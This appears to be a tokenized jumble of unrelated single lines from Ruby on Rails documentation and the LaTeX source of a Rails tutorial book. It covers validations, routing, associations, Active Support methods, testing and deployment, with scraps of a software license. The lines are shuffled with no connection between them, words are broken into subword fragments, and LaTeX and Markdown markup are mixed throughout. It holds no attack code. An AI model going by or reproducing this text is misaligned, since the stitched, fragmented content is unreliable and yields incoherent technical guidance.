▁In ▁other ▁words , ▁a ▁user ▁start s ▁on ▁another ▁user ' s ▁profile ▁page , ▁follows ▁the ▁other ▁user , ▁and ▁is ▁immediately ▁ redirected ▁back ▁to ▁the ▁original ▁page .
▁A ▁user ▁with ▁updated ▁information .
▁When ▁the ▁application ▁is ▁as k ed ▁to ▁render ▁the ▁view ▁for ▁` Blorgh :: Article sController ` ' s ╼ index ▁action , ▁it ▁will ▁first ▁look ▁for ▁the ▁path ╼` app / views / blorgh / articles / index ▖ html ▖ erb ` ▁within ▁the ▁application ▖
▁In ▁Listing ~\ ref { code : password _ reset _ edit _ action }, ▁compare ▁the ▁use ▁of
▁# ▁The ▁Expires * ▁ directive s ▁requires ▁the ▁ Apache ▁module
▁Using ▁the ▁\ k ode { full \_ title } ▁helper ▁in ▁a ▁test ▖
▁Next , ▁we ▁need ▁to ▁configure ▁Rails ▁to ▁use ▁RSpec ▁in ▁place ▁of ▁\ k ode { Test :: Uni t } .
▁# ▁=> ▁ ArgumentError : ▁invalid ▁date
▁App ly ing ▁this ▁discussion ▁to ▁the ▁User ▁model ▁yields ▁the ▁ generalized ▁\ k ode { authenticated ?}\ ▁method ▁show n ▁in ▁Listing ~\ ref { code : generalized _ authenticated _ p } .
▁has _ one ▁: through ▁Association ▁D iagram ]( images / has _ one _ through ▖ png )
▁has _ many ▁: tags
▁# ▁=> ▁Tue , ▁ 08 ▁Jun ▁2010 ▁01 : 5 6 : 22 ▁+0000
▁Ou r ▁first ▁step ▁is ▁to ▁get ▁the ▁following ▁and ▁followers ▁links ▁to ▁work .
▁( A c t u ally , ▁using ▁\ k ode { get } ▁in ▁place ▁of ▁\ k ode { match } ▁gives ▁the ▁same ▁named ▁routes , ▁but ▁using ▁\ k ode { match } ▁is ▁more ▁convention al ▖)
▁TIP : ▁You ' ll ▁find ▁that ▁the ▁output ▁from ▁` rake ▁routes ` ▁is ▁much ▁more ▁read able ▁if ▁you ▁ wide n ▁your ▁terminal ▁window ▁un til ▁the ▁output ▁lines ▁don ' t ▁wrap .
▁# ▁initialization ▁code ▁go es ▁here
▁constraints : ▁ Blacklist Constraint ▖ new
▁### ▁` with _ options `
▁Defaults ▁to ▁` ActionDispatch :: P ub li c E xception s ▖ new ( Rails ▖ public _ path ) ` .
▁@ msg ▁= ▁" N o ▁account ▁found ▁for ▁this ▁ supplier "
▁Here ' s ▁an ▁example ▁of ▁a ▁very ▁simple ▁validation :
▁user ▁= ▁User ▖ new ▁do ▁| u |
▁in ▁the ▁ Software ▁without ▁restrict ion , ▁including ▁without ▁ limit ation ▁the ▁right s
▁By ▁passing ▁the ▁symbol ▁\ k ode { : user } ▁to ▁the ▁\ k ode { factory } ▁command , ▁we ▁tell ▁ Factory ▁Girl ▁that ▁the ▁subsequent ▁definition ▁is ▁for ▁a ▁User ▁model ▁object .
▁S ince ▁the ▁Home , ▁Help , ▁and ▁About ▁page ▁title s ▁have ▁a ▁variable ▁ com p on ent , ▁we ' ll ▁use ▁a ▁special ▁Rails ▁function ▁called ▁\ k ode { provide } ▁to ▁set ▁a ▁different ▁title ▁on ▁each ▁page .
▁For ▁example , ▁if ▁an ▁order ▁belongs ▁to ▁a ▁customer , ▁but ▁the ▁actual ▁name ▁of ▁the ▁model ▁containing ▁ customers ▁is ▁` P at r on `, ▁you ' d ▁set ▁things ▁up ▁this ▁way :
▁else
▁Signup ▁failure ▁render s ▁the ▁new ▁user ▁page ▁and ▁display s ▁error ▁messages ▁automatically ▁determine d ▁by ▁Active ▁Record .
▁- ----------------
▁a 1 ▖ x ▁# ▁=> ▁1, ▁comes ▁from ▁A
▁Some ▁browsers ▁offer ▁an ▁option ▁to ▁re store ▁such ▁sessions ▁via ▁a ▁`` con t in ue ▁where ▁you ▁left ▁off '' ▁feature , ▁but ▁of ▁course ▁Rails ▁has ▁no ▁control ▁over ▁this ▁behavior .
▁ Follow ▁the ▁\ href { http :// dev center ▖ heroku ▖ com / articles / local - postgresql } { Heroku ▁instructions ▁for ▁local ▁PostgreSQL ▁installation } ▁to ▁install ▁the ▁PostgreSQL ▁database ▁on ▁your ▁local ▁system .
▁For ▁example , ▁if ▁a ▁customer ▁has ▁many ▁orders , ▁but ▁the ▁actual ▁name ▁of ▁the ▁model ▁containing ▁orders ▁is ▁` Trans action `, ▁you ' d ▁set ▁things ▁up ▁this ▁way :
▁to ▁use , ▁copy , ▁modify , ▁merge , ▁ publish , ▁distribute , ▁sub license , ▁and / or ▁ se ll
▁A ▁working ▁ preview ▁method ▁for ▁account ▁activation .
▁The ▁default ▁environment ▁for ▁the ▁Rails ▁console ▁is ▁\ text tt { development } :
▁The ▁easie st ▁and ▁recommended ▁way ▁to ▁get ▁a ▁development ▁environment ▁ready ▁to ▁ha c k ▁is ▁to ▁use ▁the ▁[ Rails ▁development ▁ box ]( https :// github ▖ com / rails / rails - dev - box ) .
▁We ' ll ▁get ▁started ▁in ▁Chapter ~\ ref { cha : static _ pages } ▁by ▁creating ▁static ▁pages ▁and ▁then ▁add ▁a ▁little ▁dynamic ▁content .
▁No rm ally , ▁website s ▁run ▁on ▁ port ▁ 80 , ▁but ▁this ▁usually ▁requires ▁special ▁privilege s , ▁so ▁Rails ▁ pick s ▁a ▁less ▁restrict ed ▁high er - number ed ▁ port ▁for ▁the ▁development ▁server .
▁It ▁is ▁explicitly ▁set ▁to ▁true ▁in ▁` config / environments / production ▖ rb ` .
▁Here ▁are ▁some ▁things ▁to ▁think ▁about :
▁ Second , ▁the ▁method ▁itself ▁is ▁only ▁used ▁internally ▁by ▁the ▁User ▁model , ▁so ▁there ' s ▁no ▁need ▁to ▁expose ▁it ▁to ▁out side ▁users .
▁< p > Customer : ▁<%= ▁customer ▖ name ▁%></ p >
▁One ▁way ▁to ▁use ▁partials ▁is ▁to ▁treat ▁them ▁as ▁the ▁equivalent ▁of ▁sub r out in es ; ▁a ▁way ▁to ▁move ▁details ▁out ▁of ▁a ▁view ▁so ▁that ▁you ▁can ▁gra s p ▁what ' s ▁going ▁on ▁more ▁easily ▖
▁In ▁earlier ▁ 2008 , ▁ malicious ▁code ▁appear ed ▁in ▁ banner ▁ ads ▁on ▁popular ▁site s , ▁such ▁as ▁ MySpace ▁and ▁E x c ite , ▁according ▁to ▁[ T r end ▁M ic r o ]( http :// blog ▖ tr end micro ▖ com / my space - ex c ite - and - b li c k - serv e - up - malicious - banner - ads / ) .
▁The ▁` content _ for ` ▁method ▁allows ▁you ▁to ▁insert ▁content ▁into ▁a ▁named ▁` yield ` ▁block ▁in ▁your ▁layout ▖
▁When ▁construct ing ▁a ▁form ▁using ▁\ k ode { form \_ for (@ user ) }, ▁Rails ▁uses ▁\ text tt { POST } ▁if ▁\ line break ▁\ k ode {@ user ▖ new \_ record ?}\ ▁is ▁\ k ode { true } ▁and ▁\ text tt { PATCH } ▁if ▁it ▁is ▁\ k ode { false } .
▁The ▁` validates _ with ` ▁helper ▁take s ▁a ▁class , ▁or ▁a ▁list ▁of ▁classes ▁to ▁use ▁for ╼ validation ▖
▁We ' ll ▁learn ▁more ▁about ▁foreign ▁keys ▁in ▁Section ~\ ref { sec : relationship _ user _ associations } .
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / class / subclasses ▖ rb ` .
▁( If ▁you ▁already ▁started ▁a ▁server ▁in ▁your ▁first ▁ tab , ▁ press ▁ Ctrl - C ▁to ▁ sh u t ▁it ▁down ▖)
▁The ▁full ▁data ▁model ▁appears ▁in ▁Figure ~\ ref { fig : user _ model _ account _ activation } .
▁The ▁issue ▁is ▁that ▁web ▁application ▁repositories ▁m ight ▁contain ▁ potentially ▁ sensitive ▁information ▁such ▁as ▁ crypt o gr a ph ic ▁keys ▁and ▁passwords , ▁which ▁could ▁be ▁used ▁to ▁ com p r o mis e ▁the ▁security ▁of ▁a ▁site ▁running ▁the ▁code .
▁t ▖ string ▁: name
▁Client ▖ select (" view able _ by , ▁ locked ")
▁That ' s ▁ o k , ▁we ▁can ▁ignore ▁that ▁for ▁now ▖
▁The ▁case ▁of ▁valid ▁data ▁is ▁similar , ▁but ▁instead ▁of ▁verify ing ▁that ▁the ▁user ▁count ▁doesn ' t ▁change , ▁we ▁check ▁that ▁click ing ▁the ▁button ▁changes ▁the ▁count ▁by ▁1 :
▁The ▁class ▁` DateTime ` ▁is ▁a ▁sub class ▁of ▁` Date ` ▁so ▁by ▁loading ▁` active _ support / core _ ext / date / calculations ▖ rb ` ▁you ▁inherit ▁these ▁methods ▁and ▁their ▁alias es , ▁except ▁that ▁they ▁will ▁always ▁return ▁ datetime s :
▁Note ▁that ▁we ' ve ▁taken ▁this ▁opportunit y ▁to ▁introduce ▁an ▁\ k ode { if } - \ k ode { else } ▁branch ing ▁structure , ▁which ▁allows ▁us ▁to ▁handle ▁the ▁cases ▁of ▁failure ▁and ▁ success ▁separate ly ▁base d ▁on ▁the ▁value ▁of ▁\ k ode {@ user ▖ save }, ▁which ▁( as ▁we ▁saw ▁in ▁Section ~\ ref { sec : creating _ user _ objects }) ▁is ▁either ▁\ k ode { true } ▁or ▁\ k ode { false } ▁depending ▁on ▁whether ▁or ▁not ▁the ▁save ▁succeed s .
▁Mailer ▁Testing
▁How ▁ detailed ▁you ▁want ▁to ▁make ▁your ▁tests ▁is ▁up ▁to ▁you ; ▁a ▁suggest ed ▁template ▁appears ▁in ▁Listing ~\ ref { code : error _ messages _ test } .
▁In ▁order ▁to ▁get ▁our ▁be ar ing s , ▁it ' s ▁helpful ▁to ▁recall ▁the ▁Rails ▁directory ▁structure ▁from ▁Section ~\ ref { sec : the _ first _ application } ▁( Figure ~\ ref { fig : directory _ structure _ rails }) .
▁We ' ll ▁end ▁with ▁a ▁couple ▁of ▁more ▁general ▁ways ▁of ▁find ing ▁users .
▁So ▁how ▁do ▁we ▁know ▁if ▁we ▁really ▁destroyed ▁an ▁object ?
▁Pages ▁to ▁display ▁followed ▁users ▁and ▁followers ▁will ▁resembl e ▁a ▁ hybrid ▁of ▁the ▁user ▁profile ▁page ▁and ▁the ▁user ▁index ▁page ▁( Section ~\ ref { sec : user _ index }), ▁with ▁a ▁ sidebar ▁of ▁user ▁information ▁( including ▁the ▁following ▁ stats ) ▁and ▁a ▁list ▁of ▁users .
▁No ▁meaning ful ▁tests
▁create ▁app / views / blorgh / articles
▁( Note ▁the ▁index ▁on ▁\ k ode { user \_ id } ▁and ▁\ k ode { created \_ at } ▖)
▁X 1 ▁= ▁1
▁It ▁is ▁show n ▁only ▁for ▁purposes ▁of ▁i ll u str ation ▖)
▁# ▁app / controllers / users _ controller ▖ rb
▁As ▁with ▁most ▁previous ▁examples ▁of ▁access ▁control , ▁we ' ll ▁write ▁the ▁tests ▁first , ▁as ▁show n ▁in ▁Listing ~\ ref { code : following _ followers _ authorization _ test } .
▁use ▁#< ActiveSupport :: Cache :: S trategy :: Local Cache :: Middleware : 0 x 0 000 000 1 c 3 04 c 8 >
▁ Updating ▁the ▁errors ▁for ▁password ▁resets .
▁< div >
▁=> ▁42
▁C or re c t ▁code ▁for ▁failed ▁login ▖
▁To ▁make ▁a ▁working ▁activation ▁email , ▁we ' ll ▁first ▁customize ▁the ▁generated ▁template ▁as ▁show n ▁in ▁Listing ~\ ref { code : application _ mailer } .
▁To ▁pass ▁the ▁object ▁to ▁the ▁partial , ▁we ▁use ▁a ▁hash ▁with ▁value ▁equal ▁to ▁the ▁object ▁and ▁key ▁equal ▁to ▁the ▁desired ▁name ▁of ▁the ▁variable ▁in ▁the ▁partial , ▁which ▁is ▁what ▁this ▁code ▁accomplish es :
▁Now ▁that ▁we ' ve ▁ filled ▁in ▁sever al ▁of ▁the ▁layout ▁links , ▁it ' s ▁a ▁good ▁idea ▁to ▁test ▁them ▁to ▁make ▁sure ▁they ' re ▁working ▁correctly .
▁Listing ~\ ref { code : micropost _ ordering } ▁introduce s ▁the ▁`` s tab by ▁ lambda '' ▁syntax ▁for ▁an ▁object ▁called ▁a ▁\ emph { Proc } ▁( procedure ) ▁or ▁\ emph { lambda }, ▁which ▁is ▁an ▁\ emph { anonymous ▁function } ▁( a ▁function ▁created ▁without ▁a ▁name ) .
▁If ▁you ▁do ▁this , ▁you ▁put ▁your ▁entire ▁database ▁at ▁risk ▁because ▁once ▁a ▁user ▁find s ▁out ▁they ▁can ▁ exploit ▁your ▁database ▁they ▁can ▁do ▁just ▁about ▁anything ▁to ▁it ▖
▁As ▁noted ▁in ▁Section ~\ ref { sec : updating _ user _ objects }, ▁this ▁method ▁by pass es ▁the ▁validations , ▁which ▁is ▁necessary ▁in ▁this ▁case ▁because ▁we ▁don ' t ▁have ▁access ▁to ▁the ▁user ' s ▁password ▁or ▁confirmation ▖)
▁You ▁can ▁associate ▁the ▁`: if ` ▁and ▁`: unless ` ▁options ▁with ▁a ▁symbol ▁corresponding ╼ to ▁the ▁name ▁of ▁a ▁method ▁that ▁will ▁get ▁called ▁right ▁before ▁validation ▁happens .
▁These ▁are ▁common ▁validation ▁options :
▁ 1235551234 ▖ to _ s (: phone , ▁are a _ code : ▁true )
▁As ▁a ▁general ▁rule , ▁if ▁a ▁method ▁doesn ' t ▁need ▁an ▁instance ▁of ▁an ▁object , ▁it ▁should ▁be ▁a ▁class ▁method .
▁At ▁this ▁point ▁the ▁User ▁model ▁ spec s ▁should ▁be ▁passing :
▁You ▁can ▁also ▁override ▁conditions ▁using ▁the ▁` only ` ▁method ▖
▁# ▁the ▁default ▁( validates ▁on ▁both ▁create ▁and ▁update )
▁C or re c t ▁code ▁for ▁failed ▁signin .
▁* ▁You ▁may ▁be ▁ deploying ▁to ▁more ▁than ▁one ▁server , ▁and ▁want ▁to ▁avoid ╼ d u plication ▁of ▁work .
▁These ▁two ▁forms ▁both ▁use ▁\ k ode { form \_ for } ▁to ▁manipulate ▁a ▁Relationship ▁model ▁object ; ▁the ▁main ▁difference ▁between ▁the ▁two ▁is ▁that ▁Listing ~\ ref { code : follow _ form } ▁build s ▁a ▁\ emph { new } ▁relationship , ▁whereas ▁Listing ~\ ref { code : unfollow _ form } ▁find s ▁the ▁existing ▁relationship .
▁We ▁start ▁by ▁noting ▁that ▁the ▁\ k ode { params } ▁hash ▁for ▁submitted ▁login ▁forms ▁now ▁includes ▁a ▁value ▁base d ▁on ▁the ▁checkbox ▁( as ▁you ▁can ▁verify ▁by ▁ submitting ▁the ▁form ▁in ▁Listing ~\ ref { code : remember _ me _ checkbox } ▁with ▁invalid ▁information ▁and ▁ inspect ing ▁the ▁values ▁in ▁the ▁debug ▁section ▁of ▁the ▁page ) .
▁As ▁a ▁first ▁step ▁toward ▁adding ▁links ▁and ▁style s ▁to ▁the ▁sample ▁application , ▁we ' ll ▁update ▁the ▁site ▁layout ▁file ▁\ k ode { application ▖ html ▖ erb } ▁( last ▁seen ▁in ▁Listing ~\ ref { code : application _ layout _ full _ title }) ▁with ▁ additional ▁HTML ▁structure .
▁<%= ▁form _ for ▁[ @ article , ▁@ article ▖ comments ▖ build ] ▁do ▁| f | ▁%>
▁### ▁Time
▁### ▁Static ▁S eg ment s
▁The ▁[ cache ▁control ╼ header ]( http :// www ▖ w 3 ▖ org / Protocol s / rfc 2 6 16 / rfc 2 6 16 - sec 14 ▖ html # sec 14 ▖ 9 ) ▁is ▁a ▁ W 3 C ╼ specific ation ▁that ▁describe s ▁how ▁a ▁request ▁can ▁be ▁cached ▖
▁* ▁` from `
▁will ▁return ▁\ k ode { true } ▁inside ▁an ▁integration ▁test ▁and ▁false ▁otherwise .
▁( Re call ▁from ▁Section ~\ ref { sec : uniqueness _ validation } ▁that ▁email ▁addresses ▁are ▁saved ▁as ▁all ▁lower - case , ▁so ▁here ▁we ▁use ▁the ▁\ k ode { downcase } ▁method ▁to ▁ensure ▁a ▁match ▁when ▁the ▁submitted ▁address ▁is ▁valid ▖)
▁The ▁test ▁suite ▁should ▁now ▁be ▁\ passing :
▁Let ' s ▁see ▁what ▁the ▁full ╼ th ing ▁look s ▁like :
▁In ▁the ▁case ▁of ▁our ▁User ▁model , ▁each ▁user ▁ potentially ▁has ▁many ▁microposts .
▁In ▁fact , ▁the ▁two ▁are ▁exactly ▁equivalent ; ▁\ k ode { attr \_ accessor } ▁is ▁me re ly ▁a ▁convenient ▁way ▁to ▁create ▁just ▁such ▁get ter / set ter ▁methods ▁automatically .
▁render ▁' edit '
▁A ▁file ▁for ▁RSpec ▁ u til it ies ▁with ▁a ▁\ k ode { full \_ title } ▁function .
▁is ▁part ▁of ▁the ▁asset ▁pipeline ▁( Section ~\ ref { sec : sass _ and _ the _ asset _ pipeline }), ▁and ▁any ▁stylesheets ▁in ▁this ▁directory ▁will ▁automatically ▁be ▁included ▁as ▁part ▁of ▁the ▁\ k ode { application ▖ css } ▁file ▁included ▁in ▁the ▁site ▁layout .
▁This ▁is ▁useful ▁any way , ▁but ▁just ▁in ▁case ▁you ▁don ' t ▁have ▁it ▁set ╼ up , ▁make ▁sure ▁that ▁you ▁do ▁this ▁first :
▁This ▁is ▁because ▁anything ▁other ▁than ▁\ text tt { nil } ▁or ▁\ text tt { false } ▁is ▁\ text tt { true } ▁in ▁a ▁boolean ▁context , ▁and ▁the ▁series ▁of ▁\ text tt {||} ▁expression s ▁ term in ate s ▁after ▁the ▁first ▁true ▁expression ▁is ▁evaluated .
▁If ▁this ▁example ▁ st ri k es ▁you ▁as ▁a ▁bit ▁con tr ive d , ▁good ; ▁this ▁is ▁by ▁design .
▁In ▁development ▁mode , ▁Rails ▁does ▁not ▁generally ▁require ▁you ▁to ╼ re start ▁the ▁server ; ▁changes ▁you ▁make ▁in ▁files ▁will ▁be ▁automatically ▁ pick ed ▁up ▁by ╼ the ▁server .
▁# ▁The ▁ visible _ articles ▁method ▁below ▁is ▁expected ▁to ▁return ▁a ▁ Relation .
▁ Image ▁upload ▁in ▁production .
▁ puts ▁client ▖ address ▖ post code
▁ Pro no un c ed ▁`` Engine ▁X '' .
▁With ▁that , ▁the ▁ core ▁follow / unfollow ▁functionality ▁is ▁complete , ▁and ▁any ▁user ▁can ▁follow ▁( or ▁ unfollow ) ▁any ▁other ▁user , ▁which ▁you ▁should ▁verify ▁both ▁by ▁click ing ▁around ▁in ▁the ▁sample ▁application ▁and ▁by ▁running ▁the ▁test ▁suite :
▁You ▁should ▁use ▁this ▁option ▁only ▁when ▁the ▁string ╼ re present s ▁a ▁really ▁short ▁ condition .
▁There ▁are ▁cases ▁where ▁the ▁user ▁time ▁ zone ▁m ight ▁be ▁in ▁the ▁future ▁compar ed ▁to ▁the ▁system ▁time ▁ zone , ▁which ▁` Time ▖ now ` ▁uses ▁by ▁default ▖
▁$ ▁rails ▁c
▁=> ▁ String
▁In ▁order ▁to ▁validate ▁ associated ▁records ▁who se ▁presence ▁is ▁required , ▁you ▁must ╼ specify ▁the ▁`: inverse _ of ` ▁option ▁for ▁the ▁association :
▁ NoMethodError : ▁You ▁have ▁a ▁nil ▁object ▁when ▁you ▁did n ' t ▁expect ▁it !
▁Whi le ▁these ▁are ▁ sufficient ▁for ▁most ▁use ▁cases , ▁there ▁are ▁c irc um st ance s ▁when ▁you ▁want ▁more ▁ environments .
▁Change ▁the ▁content ▁of ▁the ▁\ k ode { hello } ▁action ▁in ▁Listing ~\ ref { code : hello _ action } ▁to ▁read ▁`` hola , ▁ mundo !'' ▁instead ▁of ▁`` hello , ▁world !'' .
▁On ce ▁Guard ▁is ▁configured , ▁you ▁should ▁open ▁a ▁new ▁terminal ▁and ▁( as ▁with ▁the ▁Rails ▁server ▁in ▁Section ~\ ref { sec : rails _ server }) ▁run ▁it ▁at ▁the ▁command ▁line ▁as ▁follows :
▁You ▁can ▁as k ▁that ▁` nil ` ▁is ▁returned ▁instead ▁with ▁the ▁`: allow _ nil ` ▁option :
▁You ▁m ight ▁find ╼ some one ▁who ' s ▁also ▁interested ▁in ▁build ing ▁that ▁feature ▖
▁Fin ally , ▁I ▁needed ▁to ▁tell ▁ RVM ▁where ▁O p en SSL ▁was ▁located ▁when ▁ installing ▁Ruby ~ 2▖0▖ 0 :
▁\ label { fig : heroku _ sample _ users } }╼\ end { figure }╼╼\ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )╼\ label { sec : updating _ what _ we _ learned _ in _ this _ chapter }╼╼\ begin { item ize }╼╼\ item
▁Now ▁the ▁A li ce ▁scenario ▁above ▁will ▁work ▁fine : ▁the ▁database ▁will ▁save ▁a ▁user ▁record ▁base d ▁on ▁the ▁first ▁request , ▁and ▁will ▁reject ▁the ▁second ▁save ▁for ▁violat ing ▁the ▁uniqueness ▁constraint .
▁\ href { http :// p eep code ▖ com /}{ PeepCode } ▁and ▁\ href { http :// mb sy ▖ co / 6 V Q 8 l } { Code ▁School } : ▁The ▁ screencasts ▁at ▁ PeepCode ▁and ▁inter active ▁course s ▁at ▁Code ▁School ▁are ▁consistent ly ▁high - q u al ity , ▁and ▁I ▁ w ar m ly ▁recommend ▁them .
▁At ▁each ▁stage ▁of ▁developing ▁the ▁sample ▁application , ▁we ▁will ▁write ▁\ emph { small , ▁bit e - size d } ▁pieces ▁of ▁code --- simple ▁enough ▁to ▁understand , ▁yet ▁no ve l ▁enough ▁to ▁be ▁challenging .
▁Be side s ▁the ▁standard ▁` assets /* ` ▁paths , ▁ additional ▁( full y ▁ qualified ) ▁paths ▁can ▁be ╼ add ed ▁to ▁the ▁pipeline ▁in ▁` config / application ▖ rb ` ▖
▁To ▁implement ▁the ▁ forwarding ▁itself , ▁we ▁use ▁the ▁\ k ode { redirect \_ back \_ or } ▁method ▁to ▁redirect ▁to ▁the ▁request ed ▁URL ▁if ▁it ▁exists , ▁or ▁some ▁default ▁URL ▁otherwise , ▁which ▁we ▁add ▁to ▁the ▁Sessions ▁controller ▁\ k ode { create } ▁action ▁to ▁redirect ▁after ▁successful ▁login ▁( Listing ~\ ref { code : friendly _ session _ create }) .
▁ ╼ ▁=> ▁true
▁def ▁self ▖ br o ad c a st _ notification s ( users , ▁ ▖▖▖)
▁" Admin User "▖ underscore ▁# ▁=> ▁" admin _ user "
▁The ▁files ╼ in ▁` app / assets ` ▁are ▁ never ▁served ▁directly ▁in ▁production .
▁This ▁detail ▁will ▁ never ▁be ▁important ▁in ▁this ▁tutorial , ▁and ▁the ▁foreign ▁key ▁constraint ▁isn ' t ▁even ▁supported ▁by ▁all ▁database s .
▁format ▖ json ▁ { ▁render ▁ json : ▁@ user ▁ }
▁| ▁| ▁50 6 ▁| ▁: var ia nt _ also _ ne got i ate s ▁|
▁This ▁can ▁be ▁done ▁quite ▁simply ▁with ▁the ▁`: url ` ▁option ▁of ▁` form _ for ` ▖╼
▁in ▁Listing ~\ ref { code : name _ title _ and _ head ing } .
▁< div ▁id =" right _ menu "> R ight ▁ menu ▁ items ▁here </ div >
▁We ' ll ▁first ▁get ▁set ▁up ▁with ▁a ▁free ▁ service ▁to ▁send ▁email , ▁and ▁then ▁configure ▁and ▁deploy ▁our ▁application .
▁Check ing ▁for ▁this ▁requires ▁the ▁use ▁of ▁the ▁`` not '' ▁operator ▁( Section ~\ ref { sec : objects _ and _ message _ passing }), ▁written ▁using ▁an ▁excl a m ation ▁point ~\ k ode { !} ▁and ▁usually ▁read ▁as ▁`` bang '' .
▁The ▁method ▁` ordinalize ` ▁returns ▁the ▁ ordinal ▁string ▁corresponding ▁to ▁the ▁receiver ▁ integer ▖
▁M a k ing ▁a ▁`` deep ▁copy '' ▁is ▁a ▁much ▁more ▁difficult ▁problem , ▁and ▁in ▁fact ▁has ▁no ▁general ▁solution , ▁but ▁ drop p ing ▁`` ruby ▁ deep ▁copy '' ▁into ▁a ▁search ▁engine ▁should ▁be ▁enough ▁to ▁get ▁you ▁started ▁if ▁you ▁need ▁to ▁copy ▁a ▁more ▁complicated ▁structure ▁such ▁as ▁a ▁nested ▁array ▖)
▁module ▁Blorgh :: Concern s :: Model s :: Article
▁* ▁` find _ all _ by _▖▖▖` ▁becomes ▁` where (▖▖▖)
▁( Note ▁the ▁nesting ▁of ▁the ▁table ▁CSS ▁rules , ▁which ▁works ▁only ▁because ▁of ▁the ▁Sass ▁engine ▁used ▁by ▁the ▁asset ▁pipeline ▖)
▁* ▁How ▁to ▁use ▁Active ▁Record ▁models ▁to ▁manipulate ▁data ▁store d ▁in ▁a ▁relation al ╼ ▁database .
▁* ▁Rails ▁4 ▁prefer s ▁Ruby ▁2▖0 ▁and ▁requires ▁ 1▖9▖3 ▁or ▁new er .
▁Client ▖ where (" created _ at ▁> = ▁: start _ date ▁ AND ▁created _ at ▁< = ▁: end _ date ",
▁Recall ▁that ▁the ▁id ▁of ▁the ▁user ▁is ▁available ▁in ▁the ▁\ k ode { params [: id ]} ▁variable , ▁which ▁means ▁that ▁we ▁can ▁find ▁the ▁user ▁with ▁the ▁code ▁in ▁Listing ~\ ref { code : initial _ edit _ action } .
▁ Update ▁your ▁for k :
▁\ begin { equ ation }╼\ label { eq : de lt a _ e }╼\ D el t a ▁t _ e ▁= ▁t _ N ▁- ▁t _ e .
▁<%= ▁ audio _ tag ▁" m us ic / first _ s on g ▖ mp 3 " ▁%>
▁% w ( Earth ▁Wi nd ▁ Fi re )▖ to _ sentence ▁# ▁=> ▁" Earth , ▁Wi nd , ▁and ▁ Fi re "
▁### ▁U s age ▁of ▁` return ` ▁within ▁ inline ▁callback ▁blocks
▁The ▁only ▁down side ▁to ▁this ▁code ▁is ▁that ▁it ▁requires ▁a ▁ r ound ▁tri p ▁to ▁the ▁browser : ▁the ▁browser ▁request ed ▁the ▁show ▁action ▁with ▁` / books /1 ` ▁and ▁the ▁controller ▁find s ▁that ▁there ▁are ▁no ▁ books , ▁so ▁the ▁controller ▁send s ▁out ▁a ▁ 302 ▁redirect ▁response ▁to ▁the ▁browser ▁tell ing ▁it ▁to ▁go ▁to ▁` / books / `, ▁the ▁browser ▁ com p li es ▁and ▁send s ▁a ▁new ▁request ▁back ▁to ▁the ▁controller ▁as k ing ▁now ▁for ▁the ▁` index ` ▁action , ▁the ▁controller ▁then ▁get s ▁all ▁the ▁ books ▁in ▁the ▁database ▁and ▁render s ▁the ▁index ▁template , ▁sending ▁it ▁back ▁down ▁to ▁the ▁browser ▁which ▁then ▁shows ▁it ▁on ▁your ▁ screen .
▁You ▁can ▁have ▁as ▁many ▁manifest ▁files ▁as ▁you ▁need ▖
▁This ▁means ▁that ▁if ▁you ▁were ▁to ▁make ▁a ╼ t y p ical ▁` GET ` ▁to ▁a ▁controller ▁in ▁a ▁controller ' s ▁functional ▁test ▁like ▁this :
▁If ▁you ' re ▁using ▁S ublime ▁Text , ▁there ▁is ▁a ▁powerful ▁set ▁of ▁helper ▁commands ▁to ▁run ▁tests ▁directly ▁inside ▁the ▁editor .
▁Implement ing ▁the ▁user / relationships ▁\ k ode { has \_ many } ▁association .
▁account ▖ to _ query (' com p any [ name ] ')
▁layout ▁' a wesome ' ▁# ▁use ▁a wesome ▖ ( html | text )▖ erb ▁as ▁the ▁layout
▁As ▁with ▁the ▁first ▁line , ▁what ▁go es ▁inside ▁the ▁ quot e ▁mark s ▁is ▁irrelevant ▁to ▁RSpec , ▁and ▁is ▁intend ed ▁to ▁be ▁ de script ive ▁to ▁ human ▁readers .
▁The ▁ seed ▁data ▁code ▁with ▁an ▁admin ▁user .
▁The ▁default ▁page ▁with ▁the ▁application ' s ▁environment .
▁#### # ▁` collection ▖ where (▖▖▖)
▁ Default ▁is ▁`: utc ` .
▁* ▁The ▁basic ▁principle s ▁of ▁ MVC ▁( Model , ▁View , ▁Controller ) ▁and ▁RESTful ▁design .
▁d ▁= ▁Date ▖ new (201 0, ▁5 , ▁ 8 ) ▁# ▁=> ▁S at , ▁ 08 ▁May ▁2010
▁### ▁U s age
▁#### ▁A ▁note ▁on ▁De co ra to rs ▁and ▁Load ing ▁Code
▁With ▁the ▁test ▁in ▁Listing ~\ ref { code : signup _ with _ account _ activation _ test }, ▁we ' re ▁ready ▁to ▁refactor ▁a ▁little ▁by ▁mov ing ▁some ▁of ▁the ▁user ▁ manipulati on ▁out ▁of ▁the ▁controller ▁and ▁into ▁the ▁model .
▁Let ' s ▁look ▁at ▁the ▁new ▁elements ▁in ▁Listing ~\ ref { code : layout _ new _ structure } ▁from ▁to p ▁to ▁bottom .
▁Now ▁that ▁we ▁have ▁tests ▁for ▁the ▁URLs ▁we ▁want , ▁it ' s ▁time ▁to ▁get ▁them ▁to ▁work .
▁* ▁Otherwise , ▁if ▁the ▁argument ▁respond s ▁to ▁` to _ ary ` ▁it ▁is ▁invoke d , ▁and ▁if ▁the ▁value ▁of ▁` to _ ary ` ▁is ▁not ▁` nil `, ▁it ▁is ▁returned .
▁At ▁present , ▁new ly ▁registered ▁users ▁immediately ▁have ▁full ▁access ▁to ▁their ▁account s ▁( Chapter ~\ ref { cha : sign _ up }) .
▁After ▁you ' ve ▁merge d ▁in ▁the ▁changes , ▁you ▁can ▁t id y ▁up ▁your ▁branch es ▁by ▁ deleting ▁the ▁topic ▁branch ▁using ▁\ k ode { git ▁branch ▁- d } ▁if ▁you ' re ▁done ▁with ▁it :
▁REST ▁is ▁an ▁ ar ch ite c t ur al ▁style ▁for ▁developing ▁distribute d , ▁ net work ed ▁systems ▁and ▁software ▁applications ▁such ▁as ▁the ▁World ▁Wi de ▁Web ▁and ▁web ▁applications .
▁At ▁this ▁ early ▁stage , ▁writing ▁tests ▁m ight ▁thus ▁seem ▁h o pe less ly ▁in t im id ating .
▁Before ▁we ▁di g ▁into ▁more ▁details , ▁let ' s ▁t al k ▁about ▁how ▁validations ▁fit ▁into ▁the ╼ b ig ▁ picture ▁of ▁your ▁application .
▁<%= ▁render ▁@ products ▁%>
▁class ▁ Proc
